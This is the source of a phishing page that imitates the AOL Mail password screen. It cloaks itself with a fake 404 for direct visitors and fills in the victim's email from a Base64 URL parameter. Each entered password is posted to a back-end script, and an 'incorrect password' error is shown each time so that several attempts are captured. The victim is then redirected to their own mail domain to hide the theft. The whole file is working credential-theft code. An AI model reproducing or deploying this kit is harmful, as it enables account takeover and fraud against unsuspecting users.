<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Aol Mail</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="nav-yahoo" class="sp-div" style="height: 84px;padding-left: 27px;padding-right: 27px;padding-top: 22px;padding-bottom: 22px;"><img class="img-fluid" width="850" height="300" src="../assets/img/aol-logo-black-v1.png" style="height: 36px;width: auto;">
        <div><a href="#" style="margin-right: 12px;color: #0d66ff;font-size: 14px;">Help</a><a href="#" style="margin-right: 12px;color: #0d66ff;font-size: 14px;">Terms</a><a href="#" style="margin-right: 12px;color: #0d66ff;font-size: 14px;">Privacy</a></div>
    </div>
    <div id="main-outer-yahoo" class="c-div">
        <div id="main-con-yahoo" class="sp-div" style="width: 100%;max-width: 1030px;">
            <div id="yahoo-left" style="width: auto;padding-top: 33px;padding-bottom: 33px;padding-left: 28px;padding-right: 28px;">
                <h1 class="fw-bold" style="font-size: 22px;">AOL makes it easy to enjoy what matters most in your world.</h1>
                <p class="fw-normal" style="font-size: 20px;">Best in class AOL, breaking local, national and global news,finance, sports, music, movies and more. You get more out of theweb, you get more out of life.</p>
            </div>
            <div class="fw-semibold" id="yahoo-right" style="width: 100%;max-width: 360px;height: 550px;border: 1px solid #dadada;border-radius: 16px;padding-top: 26px;padding-bottom: 26px;padding-left: 22px;padding-right: 22px;min-width: 360px;">
                <div class="c-div"><img class="img-fluid" width="850" height="300" src="../assets/img/aol-logo-black-v1.png" style="height: 36px;width: auto;"></div>
                <p id="backEm" style="text-align: center;margin-top: 16px;">Back Email</p>
                <h5 style="text-align: center;font-weight: bold;margin-bottom: 0px;">Enter Password</h5>
                <p style="text-align: center;margin-top: 6px;">to finish sign in</p>
                <p class="fw-normal" id="err" style="color: rgb(225,0,0);font-size: 12px;text-align: center;">Incorrect password, Please try again.</p><label class="form-label dblock" style="font-size: 14px;margin-bottom: 0px;">Password</label><input type="password" id="pass" style="width: 100%;height: 33px;border-style: none;border-bottom: 1px solid rgb(228,228,228);margin-bottom: 6px;padding: 1px 8px;"><a class="dblock" href="#" style="margin-right: 12px;color: #0d66ff;font-size: 14px;">Forgot Password?</a><button class="btn btn-primary fw-semibold" id="next-btn" type="button" style="margin-top: 16px;width: 100%;background: #0d66ff;border-style: none;border-radius: 0px;height: 43px;" onclick="nextFun();">Next</button>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>